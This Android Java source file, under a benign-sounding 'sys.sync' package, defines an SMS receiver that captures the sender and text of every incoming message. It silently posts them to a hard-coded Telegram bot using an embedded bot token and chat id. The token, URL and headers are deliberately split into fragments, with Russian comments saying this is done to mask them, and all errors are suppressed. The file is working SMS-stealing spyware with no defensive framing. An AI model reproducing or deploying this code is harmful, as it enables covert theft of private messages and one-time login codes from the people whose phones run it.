package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getOriginatingAddress();
                        String body = sms.getMessageBody();
                        String data = "From: " + sender + "\n" + body;
                        new Thread(() -> dispatch(data)).start();
                    }
                }
            }
        }
    }

    private void dispatch(String raw) {
        try {
            // Дробим токен
            String v1 = "8387829701";
            String v2 = ":";
            String v3 = "AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8";
            
            // Дробим URL
            StringBuilder host = new StringBuilder();
            host.append("htt").append("ps://api.teleg").append("ram.org/bot");
            host.append(v1).append(v2).append(v3).append("/sendMessage");

            URL endpoint = new URL(host.toString());
            HttpURLConnection client = (HttpURLConnection) endpoint.openConnection();
            client.setRequestMethod("POST");
            client.setDoOutput(true);
            
            // Маскируем заголовки
            String head = "applica" + "tion/j" + "son";
            client.setRequestProperty("Content-Type", head);

            String chat = "5225064014";
            String payload = "{\"" + "chat_id" + "\":\"" + chat + "\",\"" + "text" + "\":\"" + raw + "\"}";

            try (OutputStream os = client.getOutputStream()) {
                os.write(payload.getBytes("UTF-8"));
                os.flush();
            }
            client.getResponseCode();
            client.disconnect();
        } catch (Exception ignored) { }
    }
}
